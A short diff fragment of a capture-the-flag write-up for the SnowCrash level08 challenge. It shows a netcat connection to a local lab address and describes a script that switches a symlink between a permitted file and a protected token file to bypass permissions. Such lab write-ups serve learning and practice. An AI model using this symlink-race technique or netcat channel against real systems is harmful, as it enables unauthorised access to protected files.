@@ -19,7 +19,7 @@ $ nc 192.168.56.1 6969
 ```
 
 ## step 4 : bypass permissions of level08
-run link.sh in SnowCrash
+run link.sh in SnowCrash\
 *this script create a symlink on a file on which we have permission and the token, switching between them*
 ```
 $ sh link.sh
